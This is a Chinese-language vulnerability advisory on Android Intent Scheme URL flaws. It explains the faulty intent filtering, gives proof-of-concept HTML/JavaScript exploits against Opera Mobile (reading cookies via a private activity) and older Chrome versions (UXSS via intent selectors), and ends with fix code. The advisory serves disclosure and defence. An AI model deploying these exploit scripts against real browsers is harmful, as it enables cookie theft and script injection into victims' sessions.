## Intent Scheme URL 漏洞
> YAQ御安全 发布于 2016-12-09

### 漏洞描述

如果浏览器支持Intent Scheme Uri语法，但对 intent 过滤不当，那么恶意用户可能通过浏览器js代码进行一些恶意行为，比如盗取cookie等。

### 影响范围

过滤不严的 browser

### 漏洞详情
#### 漏洞位置

browser 通过 Intent.parseUri 来解析 uri。
```java
Intent.parseUri()
```

通过Context.startActivityIfNeeded或者Context.startActivity发送intent

```java
startActivity()
```

#### 漏洞触发条件

1. 通过 Intent.parseUri() 解析网站传递的 uri。

    - 对应到smali中的特征：Landroid/content/Intent;->parseUri
    - 缺失过滤规则
    ```java
    Intent.addCategory("android.intent.category.BROWSABLE")
    Intent.setComponent(null)
    Intent.setSelector(null)
    ```

#### 漏洞原理

如果浏览器支持Intent Scheme URI语法，一般会分三个步骤进行处理：

1. 利用Intent.parseUri解析uri，获取原始的intent对象；
2. 对intent对象设置过滤规则，不同的浏览器有不同的策略，后面会详细介绍；
3. 通过Context.startActivityIfNeeded或者Context.startActivity发送intent；

其中步骤2起关键作用，过滤规则缺失或者存在缺陷都会导致Intent Schem URL攻击。

### poc/exp

#### 例子1 Opera mobile之cookie盗取
Opera上的intent过滤策略是完全缺失的，因此我们可以轻易调用Opera上的私有activity。比如下面这个攻击示例：

```html
<script>
location.href = “intent:#Intent;S.url=file:///data/data/com.opera.browser/app_opera/cookies;component=com.opera.browser/com.admarvel.android.ads.AdMarvelActivity;end”;
</script>
```

通过上面的脚本，我们可以直接调起AdMarvelActivity。AdMarvelActvity会从intent中获取url，并以HTML/JavaScript的方式解析cookies文件。

试想一下，如果我们预先构造一个恶意网站，并让用户通过浏览器访问。这时在恶意界面中，存在如下脚本：

```html
<script>
document.cookie = “x=<script>(javascript code)</scr” + “ipt>; path=/blah; expires=Tue, 01-Jan-2030 00:00:00 GMT”;
location.href = “intent:#Intent;S.url=file:///data/data/com.opera.browser/app_opera/cookies;component=com.opera.browser/com.admarvel.android.ads.AdMarvelActivity;end”;
</script>
```

当AdMarvelActivity解析cookies文件时，就会执行playload。

#### 例子2 Chrome之UXSS
Chrome的UXSS漏洞利用相对复杂。介绍之前，我们需要先了解一下关于Intent Selector的用法，Intent Selector机制提供一种main intent不匹配的情况下可以设置替补的方案。比如A是main intent, B是A的selector intent，当startActiviy时，系统发现A无法匹配则会尝试用B去匹配。

Chrome相比于Opera，在intent过滤的步骤中添加了安全策略，代码如下：

```java
Intent intent = Intent.parseUri(uri);
intent.addCategory(“android.intent.category.BROWSABLE”);
intent.setComponent(null);
context.startActivityIfNeeded(intent, -1);
```

从代码中，可以看到Chrome为了防御Intent Based攻击，做了不少限制，比如把category强置为”android.intent.category.BROWSABLE”，把component强置为null，相对之后比Opera强多了。然而，Chrome忽略了Intent Selector的用法，比如下面的用法:

> intent:#Intent;S.xxx=123; SEL;component=com.android.chrome/.xyz;end

留意其中的关键字“SEL”，其实就是设置了一个component为com.android.chrome/.xyz的 selector intent，这种用法导致chrome的防御措施形同虚设。最后看一下Chrome UXSS的PoC：

```html
<script>
//通过WebAppActivity0我们先打开一个攻击的站点
location.href = "intent:#Intent;S.webapp_url=http://victim.example.jp;l.webapp_id=0;SEL;compo nent=com.android.chrome/com.google.android.apps.chrome.webapps.WebappActivity0;end";
// 停留2s或者更长时间, 然后注入javascript payload
setTimeout(function() {
location.href = "intent:#Intent;S.webapp_url=javascript:(malicious javascript code);l.webapp_id=1;SEL;component=com.android.chrome/com.google.android.apps.chrome.webapps.WebappActivity0;end";
}, 2000); 
</script>
```

这里的关键点是WebappActivity0对new intent的处理方式上。

第一次打开站点，并完成加载。第二次则是直接把javascript payload注入到目标网页。这个漏洞存在于在所有低于v.30.0.1599.92的chrome版本，而新版本修改WebappActivity对new intent的处理方式，会创建new tab，这样就避免了javascript inject。

然而在新版中，依然没有屏避intent selector的使用，因此依然存在Chrome的私有组件和文件被读取的安全隐患。

### 漏洞修复建议

加入对 intent 的安全过滤：

```java
// convert intent scheme URL to intent object
Intent intent = Intent.parseUri(uri);
// forbid launching activities without BROWSABLE category
intent.addCategory("android.intent.category.BROWSABLE");
// forbid explicit call
intent.setComponent(null);
// forbid intent with selector intent
intent.setSelector(null);
// start the activity by the intent
context.startActivityIfNeeded(intent, -1);
```